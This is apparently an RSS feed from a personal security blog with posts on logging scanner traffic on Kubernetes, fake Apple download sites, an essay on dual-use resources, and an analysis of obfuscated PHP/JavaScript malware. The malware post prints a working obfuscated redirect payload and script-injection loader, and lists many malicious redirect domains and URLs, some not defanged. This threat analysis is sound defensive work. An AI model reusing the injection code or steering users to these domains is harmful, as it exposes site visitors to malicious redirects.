<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Intelligence on Floyd</title><link>https://hightower.space/tags/threat-intelligence/</link><description>Recent content in Threat Intelligence on Floyd</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 01 Sep 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://hightower.space/tags/threat-intelligence/index.xml" rel="self" type="application/rss+xml"/><item><title>Logging Scans from Vulnerability and Exploit Scanners (for Fun)</title><link>https://hightower.space/posts/k8s-scanner-collector/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/k8s-scanner-collector/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>In this post, I explain a script (deployable to k8s) which will log incoming requests to collect requests from vulnerability and exploit scanners.&lt;/p>
&lt;p>It&amp;rsquo;s very basic and is not meant for any production use-cases, but it just a fun project to learn more about GoLang, k8s, and vulnerability scanners.&lt;/p>
&lt;h2 id="overview">Overview&lt;/h2>
&lt;p>You can find the scanner on Github &lt;a href="https://github.com/fhightower/k8s-scanner-collector">here&lt;/a>.&lt;/p>
&lt;p>We&amp;rsquo;ll deploy it to a k8s cluster (I&amp;rsquo;m using &lt;a href="https://docs.digitalocean.com/products/kubernetes/">DigitalOcean&amp;rsquo;s Kubernetes service&lt;/a> (DOKS)) and see what vulnerability and exploit scanners hit our app!&lt;/p>
&lt;p>If you&amp;rsquo;ve never built a docker image, pushed it to a registry, and/or deployed that image to k8s, you can keep reading this post as I&amp;rsquo;ll walk you through the process, but you may also find
DigitalOcean&amp;rsquo;s &lt;a href="https://docs.digitalocean.com/tutorials/build-and-deploy-your-first-image-to-your-first-cluster/">guide on the subject&lt;/a> helpful.&lt;/p>
&lt;h2 id="the-process">The process&lt;/h2>
&lt;p>The process requires four steps:&lt;/p>
&lt;ol>
&lt;li>Create a docker image&lt;/li>
&lt;li>Push docker image to a registry&lt;/li>
&lt;li>Deploy that image to a k8s cluster&lt;/li>
&lt;li>View logs showing scanner activity&lt;/li>
&lt;/ol>
&lt;p>So let&amp;rsquo;s jump in!&lt;/p>
&lt;h3 id="create-docker-image">Create Docker Image&lt;/h3>
&lt;p>To create a docker image locally, we start by cloning the &lt;a href="https://github.com/fhightower/k8s-scanner-collector">repo&lt;/a>:&lt;/p>
&lt;pre tabindex="0">&lt;code>git clone git@github.com:fhightower/k8s-scanner-collector.git;
cd k8s-scanner-collector;
&lt;/code>&lt;/pre>&lt;p>and we build a docker image with the name &lt;code>scanner-collector&lt;/code> like:&lt;/p>
&lt;pre tabindex="0">&lt;code>docker build -t scanner-collector .
&lt;/code>&lt;/pre>&lt;p>You can look at the &lt;code>Dockerfile&lt;/code> to see what is included in this docker image.&lt;/p>
&lt;p>You can then run the image you created with:&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -p 80:80 scanner-collector
&lt;/code>&lt;/pre>&lt;p>which will run the scanner on http://localhost:80.&lt;/p>
&lt;p>If you run this locally, you can see that, for each request, it logs:&lt;/p>
&lt;ul>
&lt;li>The requested path&lt;/li>
&lt;li>The IP from which the request is coming (we make a best effort to find this)&lt;/li>
&lt;/ul>
&lt;h3 id="push-docker-image-to-registry">Push Docker Image to Registry&lt;/h3>
&lt;p>Next, we&amp;rsquo;ll deploy our docker image to a registry (in this case, in DigitalOcean, but the process should be similar for different cloud providers).&lt;/p>
&lt;p>To do this, we&amp;rsquo;ll use the &lt;a href="https://docs.digitalocean.com/reference/doctl/how-to/install/">doctl&lt;/a> cli.&lt;/p>
&lt;p>We start by &lt;a href="https://cloud.digitalocean.com/account/api/tokens/new">creating a token&lt;/a> and then running this command which
will prompt you for your token:&lt;/p>
&lt;pre tabindex="0">&lt;code>doctl auth init
&lt;/code>&lt;/pre>&lt;p>Now, if you don&amp;rsquo;t already have a registry, run:&lt;/p>
&lt;pre tabindex="0">&lt;code>doctl registry create &amp;lt;registry-name&amp;gt;
&lt;/code>&lt;/pre>&lt;p>where &lt;code>&amp;lt;registry-name&amp;gt;&lt;/code> is globally unique.
If you already have a registry in DigitalOcean, you an skip this step.&lt;/p>
&lt;p>Next, we login into our registry:&lt;/p>
&lt;pre tabindex="0">&lt;code>doctl registry login
&lt;/code>&lt;/pre>&lt;p>Now, run this command to let docker know which image we want to push to the registry:&lt;/p>
&lt;pre tabindex="0">&lt;code>docker tag scanner-collector registry.digitalocean.com/&amp;lt;registry-name&amp;gt;/scanner-collector
&lt;/code>&lt;/pre>&lt;p>and push it to the registry:&lt;/p>
&lt;pre tabindex="0">&lt;code>docker push registry.digitalocean.com/&amp;lt;registry-name&amp;gt;/scanner-collector
&lt;/code>&lt;/pre>&lt;p>To make sure it has been pushed successfully, we can run it locally using the image from the registry:&lt;/p>
&lt;pre tabindex="0">&lt;code>docker run -p 80:80 registry.digitalocean.com/&amp;lt;registry-name&amp;gt;/scanner-collector
&lt;/code>&lt;/pre>&lt;h3 id="deploy-image-to-k8s">Deploy Image to k8s&lt;/h3>
&lt;p>Now, we&amp;rsquo;re ready to deploy our image to k8s.&lt;/p>
&lt;p>First, we create a new cluster with sane defaults:&lt;/p>
&lt;pre tabindex="0">&lt;code>doctl kubernetes cluster create &amp;lt;cluster-name&amp;gt; --tag scanner-collector --auto-upgrade=true --node-pool &amp;#34;name=mypool;count=2;auto-scale=true;min-nodes=1;max-nodes=3;tag=scanner-collector&amp;#34;
&lt;/code>&lt;/pre>&lt;p>(see more details on this command &lt;a href="https://docs.digitalocean.com/tutorials/build-and-deploy-your-first-image-to-your-first-cluster/#step-5-create-a-cluster">here&lt;/a>).&lt;/p>
&lt;p>Now, we need to give our cluster access to our private registry:&lt;/p>
&lt;pre tabindex="0">&lt;code>doctl registry kubernetes-manifest | kubectl apply -f -
kubectl patch serviceaccount default -p &amp;#39;{&amp;#34;imagePullSecrets&amp;#34;: [{&amp;#34;name&amp;#34;: &amp;#34;registry-&amp;lt;registry-name&amp;gt;&amp;#34;}]}&amp;#39;
&lt;/code>&lt;/pre>&lt;p>(see more details about these commands &lt;a href="https://docs.digitalocean.com/tutorials/build-and-deploy-your-first-image-to-your-first-cluster/#step-6-run-your-app-on-a-cluster">here&lt;/a>).&lt;/p>
&lt;p>Now for the fun part&amp;hellip; let&amp;rsquo;s deploy the collector:&lt;/p>
&lt;pre tabindex="0">&lt;code>kubectl create deployment scanner-collector --image=registry.digitalocean.com/&amp;lt;registry-name&amp;gt;/scanner-collector
&lt;/code>&lt;/pre>&lt;p>You can view the pods with:&lt;/p>
&lt;pre tabindex="0">&lt;code>kubectl get pods
&lt;/code>&lt;/pre>&lt;!-- Todo: include other interesting commands here... -->
&lt;p>Now, let&amp;rsquo;s add a load balancer so our service is publicly accessible:&lt;/p>
&lt;pre tabindex="0">&lt;code>kubectl expose deployment scanner-collector --type=LoadBalancer --port=80 --target-port=80
&lt;/code>&lt;/pre>&lt;p>This can take a few minutes to get created, but you can run this until the &lt;code>Status&lt;/code> field is &lt;code>active&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>doctl compute load-balancer list --format Name,Created,IP,Status
&lt;/code>&lt;/pre>&lt;p>Once &lt;code>Status&lt;/code> is &lt;code>active&lt;/code>, you should see an IP address which is the public IP for your deployment.&lt;/p>
&lt;p>You can visit that IP address in your browser and will see your app.&lt;/p>
&lt;h3 id="view-logs-showing-scanner-activity">View Logs Showing Scanner Activity&lt;/h3>
&lt;p>Now that we have a publicly accessible app, we can look at the logs to see if there&amp;rsquo;s anyone scanning our IP for vulnerabilities or exploits.&lt;/p>
&lt;p>I recommend running:&lt;/p>
&lt;pre tabindex="0">&lt;code>kubectl get pods
&lt;/code>&lt;/pre>&lt;p>and then, using a pod name from the output from the last command:&lt;/p>
&lt;pre tabindex="0">&lt;code>kubectl logs &amp;lt;pod-name&amp;gt;
&lt;/code>&lt;/pre>&lt;p>This will show some odd traffic like a request to &lt;code>/?XDEBUG_SESSION_START=phpstorm&lt;/code> trying to take advantage of &lt;a href="https://www.exploit-db.com/ghdb/6763">this&lt;/a> vulnerability.&lt;/p>
&lt;p>Enjoy and &lt;a href="mailto:11floyd@proton.me">let me know&lt;/a> if you find anything particularly interesting!&lt;/p></description></item><item><title>Fake Apple App Download Sites</title><link>https://hightower.space/posts/fake-apple-app-download-sites/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/fake-apple-app-download-sites/</guid><description>&lt;p>&lt;strong>Note:&lt;/strong> All URLs/domains in this post are &lt;a href="https://ioc-fanger.hightower.space/#overview">defanged&lt;/a>. You can fang/defang them &lt;a href="https://ioc-fanger.hightower.space/#use-the-package-live">here&lt;/a>.&lt;/p>
&lt;p>I was investigating how to use &lt;a href="https://elinux.org/X11">x11&lt;/a> to serve a GUI running inside a docker container for an &lt;a href="https://github.com/fhightower/nand2tetris">nand2tetris&lt;/a> project I&amp;rsquo;m working on and I found a collection of domains serving fake Apple app downloads:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://loadsea[.]heredoggi[.]com/x11-forwarding-for-mac/
hXXps://moraea[.]batteryscience[.]us/location-of-x11-libraries-mac-os/
hXXps://letdwnl[.]brittanythomassigler[.]us/mac-os-x11-app/
hXXps://gogo[.]sunshinebeagles[.]us/mac-x11-manual-pdf-5252/
hXXps://isabelmaries[.]co/xquartz-alternative/
hXXps://holidayshunter[.]naturalwatches[.]co/x11-forwarding-for-mac/
&lt;/code>&lt;/pre>&lt;p>Most of these redirect to a URL like:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://viperctum[.]info/go[.]php?url=https%3A%2F%2Fcdn[.]ketamo[.]info%2F%3Fa%3D337
89%26c%3D303745%26s1%3D111%26s2%3D1411c3vzwslb4a16%26s3%3DX11%2BForwarding%2BFor%2BM
ac&amp;amp;uclick=3vzwslb4
&lt;/code>&lt;/pre>&lt;p>Which, decoded, looks like:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://viperctum[.]info/go[.]php?url=hXXps://cdn[.]ketamo[.]info/?a=33789&amp;amp;c=303745
&amp;amp;s1=111&amp;amp;s2=1411c3vzwslb4a16&amp;amp;s3=X11+Forwarding+For+Mac&amp;amp;uclick=3vzwslb4
&lt;/code>&lt;/pre>&lt;p>When followed, this link goes to:&lt;/p>
&lt;pre tabindex="0">&lt;code>hXXps://www[.]pdf4mac[.]com/?czfjp=1296&amp;amp;e=2647&amp;amp;a=4389&amp;amp;f=pb&amp;amp;r=d2c78a53d92d4e789ead565
5b694d7101c8b4
&lt;/code>&lt;/pre>&lt;p>Which contains a download for &lt;a href="https://www.virustotal.com/gui/file/856f233ee7363c0297a4f84e8783cdae0098ada0241009957dea433ebe1270de">this&lt;/a>, undetected file.&lt;/p></description></item><item><title>Conjecture on Resource Utilization</title><link>https://hightower.space/posts/resource-utilization/</link><pubDate>Mon, 11 Feb 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/resource-utilization/</guid><description>&lt;blockquote>
&lt;p>We fifty-four were the masters of England! Twenty-five thousand men lay dead around us. But how treacherous is fortune! In a little while - say an hour - happened a thing, by my own fault, which - but I have no heart to write that. Let the record end here.&lt;sup>1&lt;/sup>&lt;/p>&lt;/blockquote>
&lt;aside class="marginnote">
&lt;span class="noteNumber">1&lt;/span> - Written by "The Boss" (from &lt;i>A Connecticut Yankee in King Arthur's Court&lt;/i>)
&lt;/aside>
&lt;blockquote>
&lt;p>We were in a trap, you see - a trap of our own making&amp;hellip; we had conquered; in turn we were conquered.&lt;sup>2&lt;/sup>&lt;/p>&lt;/blockquote>
&lt;aside class="marginnote">
&lt;span class="noteNumber">2&lt;/span> - Postscript from Clarence (from &lt;i>A Connecticut Yankee in King Arthur's Court&lt;/i>)
&lt;/aside>
&lt;blockquote>
&lt;p>Power tends to corrupt and absolute power corrupts absolutely. Great men are almost always bad men, even when they exercise influence and not authority: still more when you superadd the tendency or the certainty of corruption by authority. There is no worse heresy than that the office sanctifies the holder of it.&lt;sup>3&lt;/sup>&lt;/p>&lt;/blockquote>
&lt;aside class="marginnote">
&lt;span class="noteNumber">3&lt;/span> - Lord Acton (in his &lt;a href="https://history.hanover.edu/courses/excerpts/165acton.html" target="_blank">letter&lt;/a> to Archbishop Mandell Creighton)
&lt;/aside>
&lt;blockquote>
&lt;p>When the woman saw that the tree was good for food, and that it was a delight to the eyes, and that it was desirable to make wise, she took from its fruit and ate; and she gave also to her husband with her, and he ate.&lt;sup>4&lt;/sup>&lt;/p>&lt;/blockquote>
&lt;aside class="marginnote">
&lt;span class="noteNumber">4&lt;/span> - Genesis 3:6
&lt;/aside>
&lt;blockquote>
&lt;p>Awake, arise or be for ever fall’n.&lt;sup>5&lt;/sup>&lt;/p>&lt;/blockquote>
&lt;aside class="marginnote">
&lt;span class="noteNumber">5&lt;/span> - Spoken by Satan in &lt;i>Paradise Lost&lt;/i>
&lt;/aside>
&lt;hr>
&lt;h3 id="thesis">Thesis&lt;/h3>
&lt;p>One thing is clear about the internet age; it provides men with a scope and scale of resources hitherto unparalleled. This essay addresses, in a small way, how men tend to use the resources available to them. I will write with a particular focus on the internet and software, but the principles described here can probably be applied to other areas of economics and society in general.&lt;/p>
&lt;p>My thesis is this:&lt;/p>
&lt;blockquote>
&lt;p>Regarding resources which can be used for evil and for good:&lt;/p>
&lt;p>As the difficulty of procuring and using a resource increases, the probability of that resource being used for evil increases disproportionately to the probability of it being used for good.&lt;/p>&lt;/blockquote>
&lt;p>Before explaining this further, I must address the elephant in the room: morality. My conjecture on resource utilization uses the terms &amp;ldquo;evil&amp;rdquo; and &amp;ldquo;good&amp;rdquo; and, thus, assumes some moral standard by which &amp;ldquo;evil&amp;rdquo; and &amp;ldquo;good&amp;rdquo; can be judged. As a Christian, I believe that God Himself is the standard of goodness and evil is that which is against His character and outside of His design. That being said, a morality rooted in the nature of the Christian God is not necessary to defend and understand my conjecture; one simply has to have some objective morality by which actions and uses of resources can be judged.&lt;/p>
&lt;p>For the scope of this essay, let us assume a generally agreed-upon moral position like: &amp;ldquo;the intentional killing of innocent human beings is evil&amp;rdquo; and &amp;ldquo;protecting innocent human beings from being killed is good&amp;rdquo;. Now that we have that settled&lt;sup>6&lt;/sup>, what about my thesis?&lt;/p>
&lt;aside class="marginnote">
&lt;span class="noteNumber">6&lt;/span> - If this does not settle it for you, then there must be an immense canyon dividing our philosophies which is too great to be bridged in this essay. You may as well stop reading.
&lt;/aside>
&lt;p>My thesis is founded on the idea that there are certain resources (perhaps natural resources, time, energy, software available on the internet, or our natural abilities) that can be used to accomplish evil and can be used to accomplish good. For example, some people are naturally very persuasive. Considering this ability as a resource, it is possible to use this resource for good (e.g. to persuade someone not to kill someone else) or for evil (e.g. to persuade someone to kill an innocent person). In the software world, the existence of software projects that can be used for evil and good are everywhere; from &lt;a href="https://github.com/xn-twist/xn-twist">domain-squat creation algorithms&lt;/a> to &lt;a href="https://securingtomorrow.mcafee.com/consumer/identity-protection/what-is-rat/">remote administration tools&lt;/a>. These tools can be used alternatively for good or evil based on the intentions of the user. This thesis seeks to describe only those resources which have relatively the same, innate probabilities of being used for good vs. evil. In other words, these are resource where there is nothing inherently limiting or inclining the use of the resources to evil or good.&lt;/p>
&lt;p>My thesis also includes an assumption that some resources are more difficult to get and/or use. This is pretty self-explanatory (especially to anyone who has worked in IT, software development, or computer security), so I won&amp;rsquo;t belabor the point. Just keep in mind that the procurement and use of all resources are not equal.&lt;/p>
&lt;p>With these assumptions in mind, my thesis is the result of the question:&lt;/p>
&lt;blockquote>
&lt;p>Is there a way to determine whether or not a resource/technology is more likely to be used for good vs. evil?&lt;/p>&lt;/blockquote>
&lt;p>At first blush, the answer is no, there is no clear way to determine whether a resource will be used for good vs. evil. We&amp;rsquo;ve assumed that we are only discussing resources which have no innate inclination toward good or evil, so there is nothing in the resource itself to give us a clue as to its potential use. The only entity that would make the use of a resource more or less likely to be used for good would be the users. For resources that are easy to procure and use, I posit that it is unlikely that we would be able to determine how a resource will likely be used. But what happens when the resource gets more difficult to procure and/or use? I propose that such resources are more likely and increasingly more likely to be used for evil. In other words, the more difficult a resource is to procure and/or use, it is more probable that the resource will be used for evil rather than for good. I believe this occurs for a number of reasons which vary based on the context and the nature of the resource, but I&amp;rsquo;ve identified a few, possible causes below focusing on the realm of software.&lt;/p>
&lt;h3 id="causes">Causes&lt;/h3>
&lt;p>&lt;i>What, in my estimation, causes my conjecture to be true?&lt;/i>&lt;/p>
&lt;p>In the realm of software and computer security, I believe my conjecture is true because:&lt;/p>
&lt;ol>
&lt;li>Those who desire to do evil are generally more motivated than those who wish to do good.&lt;sup>7&lt;/sup>&lt;/li>
&lt;li>Those who desire to do evil generally do not have as many restrictions and boundaries (administrative, moral, and organizational) within which they must operate as those who do good - thus making it more likely for them to undertake and accomplish difficult tasks.&lt;/li>
&lt;li>Those who desire to do evil generally are more invested in their work. Part of this occurs because those working to do evil are often working alone and are directly involved in a malicious operation (whereas those working for good are often part of a more structured team where there is more &lt;a href="https://en.wikipedia.org/wiki/Plausible_deniability">plausible deniability&lt;/a> and less buy-in).&lt;/li>
&lt;li>Those who desire to do evil generally have more freedom to experiment and less pressure to perform in measurable ways - this allows them to experiment and be willing to &amp;lsquo;waste&amp;rsquo; more time.&lt;/li>
&lt;/ol>
&lt;aside class="marginnote">
&lt;span class="noteNumber">7&lt;/span> - This could probably be its own conjecture. In my anecdotal experience, this is generally true; doing the 'bad' stuff is cool and doing the 'good' stuff is boring.
&lt;/aside>
&lt;h3 id="implications-and-applications">Implications and Applications&lt;/h3>
&lt;p>&lt;i>If my thesis is true, what are some implications and applications of this?&lt;/i>&lt;/p>
&lt;p>Here are a few points that come to mind (specifically applicable to businesses in the computer security world):&lt;/p>
&lt;ul>
&lt;li>Teams that are seeking to use resources for good should pursue models that allow for experimentation with hard-to-procure and/or hard-to-find resources.&lt;/li>
&lt;li>Teams that are seeking to use resources for good should cultivate a culture that promotes freedom, experimentation, and buy-in. Each team member should feel that what he/she contributes is significant and that he/she is responsible for his/her actions.&lt;/li>
&lt;li>When creating publicly available software that could be used for evil or good, design the software with a bias towards the good use-cases rather than the evil ones.&lt;/li>
&lt;li>When creating publicly available software that could be used for evil or good, make it as easy to procure and use as possible. This will increase the probability that it will be used for good.&lt;/li>
&lt;/ul></description></item><item><title>Analysis of Obfuscated PHP Malware</title><link>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</link><pubDate>Tue, 29 Jan 2019 00:00:00 +0000</pubDate><guid>https://hightower.space/posts/php-malware-analysis-jan-29-part-1/</guid><description>&lt;p>&lt;i>Updated on February 27, 2019.&lt;/i>&lt;/p>
&lt;p>I am monitoring the php decoder site &lt;a href="https://malwaredecoder.com/">here&lt;/a> and was alerted when the decoded php &lt;a href="https://malwaredecoder.com/result/2333ee92d6f6872f6b5e685a9f4b3ed3">here&lt;/a> had a &lt;code>String.fromCharCode&lt;/code> command in it. After decoding the character code (&lt;code>104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112&lt;/code>)&lt;!-- &lt;sup>1&lt;/sup> -->, this produced &lt;code>https://getmyconfigplease[.]com/get[.]php&lt;/code>. The content of this site looks like:&lt;/p>
&lt;pre tabindex="0">&lt;code>var sECIQY8TzC = document.createElement(&amp;#39;script&amp;#39;); sECIQY8TzC.type = &amp;#39;text/javascript&amp;#39;; sECIQY8TzC.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 69, 110, 78, 75, 113, 71, 76, 78); document.head.appendChild(sECIQY8TzC);
&lt;/code>&lt;/pre>&lt;p>Decoding the &lt;code>String.fromCharCode&lt;/code> bit&lt;!-- &lt;sup>2&lt;/sup> --> produces &lt;code>https://pastebin.com/raw/EnNKqGLN&lt;/code>.&lt;/p>
&lt;!-- &lt;aside class="marginnote">
&lt;p>&lt;span class="noteNumber">1&lt;/span> - In biblioteca: &lt;code>fromCharCode([104, 116, 116, 112, 115, 58, 47, 47, 103, 101, 116, 109, 121, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 103, 101, 116, 46, 112, 104, 112])&lt;/code>&lt;/p>
&lt;p>&lt;span class="noteNumber">2&lt;/span> - In biblioteca: &lt;code>fromCharCode([104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 69, 110, 78, 75, 113, 71, 76, 78])&lt;/code>&lt;/p>
&lt;/aside> -->
&lt;p>The content of this site is:&lt;/p>
&lt;pre tabindex="0">&lt;code>function _0x16ac9e(){var _0x11da69=[&amp;#39;MHgy&amp;#39;,&amp;#39;MHgz&amp;#39;,&amp;#39;MHg0&amp;#39;,&amp;#39;MHg2&amp;#39;,&amp;#39;aHJlZg==&amp;#39;,&amp;#39;cmVwbGFjZQ==&amp;#39;,&amp;#39;bG9jYXRpb24=&amp;#39;,&amp;#39;aW5kZXhPZg==&amp;#39;,&amp;#39;Y29va2ll&amp;#39;,&amp;#39;QmVzdENvb2tpZT10cnVlOyBtYXgtYWdlPTIwNDAw&amp;#39;,&amp;#39;c2hpZnQ=&amp;#39;,&amp;#39;MHgw&amp;#39;,&amp;#39;MHgx&amp;#39;];(function(_0x538417,_0x48f8ea){var _0x350dbc=function(_0x2e576b){while(--_0x2e576b){_0x538417[&amp;#39;push&amp;#39;](_0x538417[&amp;#39;shift&amp;#39;]());}};_0x350dbc(++_0x48f8ea);}(_0x11da69,0xd5));var _0x4097a7=function(_0x506a3d,_0x321114){_0x506a3d=_0x506a3d-0x0;var _0x32b6f7=_0x11da69[_0x506a3d];if(_0x4097a7[&amp;#39;cNcBaR&amp;#39;]===undefined){(function(){var _0x29eb7d;try{var _0x4e84d1=Function(&amp;#39;return\x20(function()\x20&amp;#39;+&amp;#39;{}.constructor(\x22return\x20this\x22)(\x20)&amp;#39;+&amp;#39;);&amp;#39;);_0x29eb7d=_0x4e84d1();}catch(_0x476c5c){_0x29eb7d=window;}var _0x3b1078=&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#39;;_0x29eb7d[&amp;#39;atob&amp;#39;]||(_0x29eb7d[&amp;#39;atob&amp;#39;]=function(_0x2199f9){var _0x207876=String(_0x2199f9)[&amp;#39;replace&amp;#39;](/=+$/,&amp;#39;&amp;#39;);for(var _0x3d686c=0x0,_0x55acec,_0x22a388,_0x5795eb=0x0,_0x5c30ef=&amp;#39;&amp;#39;;_0x22a388=_0x207876[&amp;#39;charAt&amp;#39;](_0x5795eb++);~_0x22a388&amp;amp;&amp;amp;(_0x55acec=_0x3d686c%0x4?_0x55acec*0x40+_0x22a388:_0x22a388,_0x3d686c++%0x4)?_0x5c30ef+=String[&amp;#39;fromCharCode&amp;#39;](0xff&amp;amp;_0x55acec&amp;gt;&amp;gt;(-0x2*_0x3d686c&amp;amp;0x6)):0x0){_0x22a388=_0x3b1078[&amp;#39;indexOf&amp;#39;](_0x22a388);}return _0x5c30ef;});}());_0x4097a7[&amp;#39;qogRBP&amp;#39;]=function(_0xd61dcf){var _0x10ae9e=atob(_0xd61dcf);var _0x3a9531=[];for(var _0x3a6320=0x0,_0x8d019b=_0x10ae9e[&amp;#39;length&amp;#39;];_0x3a6320&amp;lt;_0x8d019b;_0x3a6320++){_0x3a9531+=&amp;#39;%&amp;#39;+(&amp;#39;00&amp;#39;+_0x10ae9e[&amp;#39;charCodeAt&amp;#39;](_0x3a6320)[&amp;#39;toString&amp;#39;](0x10))[&amp;#39;slice&amp;#39;](-0x2);}return decodeURIComponent(_0x3a9531);};_0x4097a7[&amp;#39;KYlgqs&amp;#39;]={};_0x4097a7[&amp;#39;cNcBaR&amp;#39;]=!![];}var _0x579681=_0x4097a7[&amp;#39;KYlgqs&amp;#39;][_0x506a3d];if(_0x579681===undefined){_0x32b6f7=_0x4097a7[&amp;#39;qogRBP&amp;#39;](_0x32b6f7);_0x4097a7[&amp;#39;KYlgqs&amp;#39;][_0x506a3d]=_0x32b6f7;}else{_0x32b6f7=_0x579681;}return _0x32b6f7;};var _0x2be368=[_0x4097a7(&amp;#39;0x0&amp;#39;),_0x4097a7(&amp;#39;0x1&amp;#39;),&amp;#39;fromCharCode&amp;#39;,&amp;#39;BestCookie=true&amp;#39;,_0x4097a7(&amp;#39;0x2&amp;#39;),_0x4097a7(&amp;#39;0x3&amp;#39;),_0x4097a7(&amp;#39;0x4&amp;#39;)];(function(_0x6e5b15,_0x2c75a3){var _0x42951f=function(_0x1975b5){while(--_0x1975b5){_0x6e5b15[&amp;#39;push&amp;#39;](_0x6e5b15[_0x4097a7(&amp;#39;0x5&amp;#39;)]());}};_0x42951f(++_0x2c75a3);}(_0x2be368,0x1c9));var _0x4755cb=function(_0x5ad1ee,_0x39c6df){_0x5ad1ee=_0x5ad1ee-0x0;var _0x38bd4b=_0x2be368[_0x5ad1ee];return _0x38bd4b;};var _0x443bde=[_0x4755cb(_0x4097a7(&amp;#39;0x6&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x7&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x8&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0x9&amp;#39;)),_0x4755cb(_0x4097a7(&amp;#39;0xa&amp;#39;)),_0x4755cb(&amp;#39;0x5&amp;#39;),_0x4755cb(_0x4097a7(&amp;#39;0xb&amp;#39;)),_0x4097a7(&amp;#39;0xc&amp;#39;)];var _0x4efd8b=String[_0x443bde[0x0]](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6f,0x72,0x6d,0x79,0x6c,0x69,0x74,0x74,0x6c,0x65,0x73,0x69,0x74,0x65,0x2e,0x78,0x79,0x7a,0x2f,0x6c,0x69,0x74,0x74,0x6c,0x65,0x2e,0x70,0x68,0x70);if(document[_0x443bde[0x3]][_0x443bde[0x2]](_0x443bde[0x1])==-0x1){document[_0x443bde[0x3]]=_0x443bde[0x4];window[_0x443bde[0x6]][_0x443bde[0x5]](_0x4efd8b);document[_0x443bde[0x6]][_0x443bde[0x5]](_0x4efd8b);window[_0x443bde[0x6]][_0x443bde[0x7]]=_0x4efd8b;document[_0x443bde[0x6]][_0x443bde[0x7]]=_0x4efd8b;}}_0x16ac9e();
&lt;/code>&lt;/pre>&lt;h3 id="update-february-27-2019">Update (February 27, 2019)&lt;/h3>
&lt;p>&lt;em>The content below was added on February 27, 2019.&lt;/em>&lt;/p>
&lt;p>Upon further investigation, the code above contains the interesting snippet:&lt;/p>
&lt;pre tabindex="0">&lt;code>(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x6f,0x72,0x6d,0x79,0x6c,0x69,0x74,0x74,0x6c,0x65,0x73,0x69,0x74,0x65,0x2e,0x78,0x79,0x7a,0x2f,0x6c,0x69,0x74,0x74,0x6c,0x65,0x2e,0x70,0x68,0x70)
&lt;/code>&lt;/pre>&lt;p>This hex that decodes to:&lt;/p>
&lt;pre tabindex="0">&lt;code>https://formylittlesite.xyz/little.php
&lt;/code>&lt;/pre>&lt;p>Visitors to this site will be redirected to a URL on one of the following domains (the full URLs are listed below):&lt;/p>
&lt;pre tabindex="0">&lt;code>appelertte.tk
atlanta-rostov.ru
avtonewsmir.ru
avtoservis5plus.ru
avtowoldsnews.ru
creditforms.site
edu-fddu.info
giner.online
greencool.icu
informzine.site
lentube.host
merkuriu.icu
picturesun.top
rriverrponse.tk
sarriverdoma.tk
school-fix-news.info
storics.info
studentachieve.tk
visnu.icu
www.twero.com
&lt;/code>&lt;/pre>&lt;p>Here are the URLs to which I was redirected:&lt;/p>
&lt;pre tabindex="0">&lt;code>http://appelertte.tk/index/?8mMwj2&amp;amp;extra_param_1=261
http://appelertte.tk/index/?8mMwj2&amp;amp;extra_param_1=695
http://atlanta-rostov.ru/2018/12/26/ken-shamrock-vs-kimbo-slice-full-fight/
http://atlanta-rostov.ru/2018/12/27/rhythmbox-vs-banshee/
http://atlanta-rostov.ru/latest.php
http://avtonewsmir.ru/the-best-stock-photos/
http://avtoservis5plus.ru/main-credit-reporting-agencies/
http://avtowoldsnews.ru/forex-trading-for-dummies-2013-pdf/
http://avtowoldsnews.ru/latest.php
http://creditforms.site/average-car-insurance-rates-florida/
http://creditforms.site/latest.php
http://creditforms.site/the-carburetors/
http://edu-fddu.info/blog/latest.php
http://giner.online/can-you-apply-for-more-than-one-credit-card/
http://greencool.icu/blog/?p=502
http://greencool.icu/blog/latest.php
http://informzine.site/2018/12/26/papigfunk/
http://informzine.site/latest.php
http://lentube.host/forex-trading-tutorials/
http://lentube.host/latest.php
http://lentube.host/top-forex-traders-in-the-world-2017/
http://lentube.host/what-is-a-broker-forex-nu3p/
http://merkuriu.icu/blog/?p=446
http://picturesun.top/blog/?p=102
http://picturesun.top/blog/?p=104
http://picturesun.top/blog/?p=125
http://picturesun.top/blog/?p=13
http://picturesun.top/blog/?p=1348
http://picturesun.top/blog/?p=1357
http://picturesun.top/blog/?p=1382
http://picturesun.top/blog/?p=1416
http://picturesun.top/blog/?p=1444
http://picturesun.top/blog/?p=1485
http://picturesun.top/blog/?p=149
http://picturesun.top/blog/?p=1494
http://picturesun.top/blog/?p=1499
http://picturesun.top/blog/?p=1509
http://picturesun.top/blog/?p=1537
http://picturesun.top/blog/?p=1553
http://picturesun.top/blog/?p=156
http://picturesun.top/blog/?p=1566
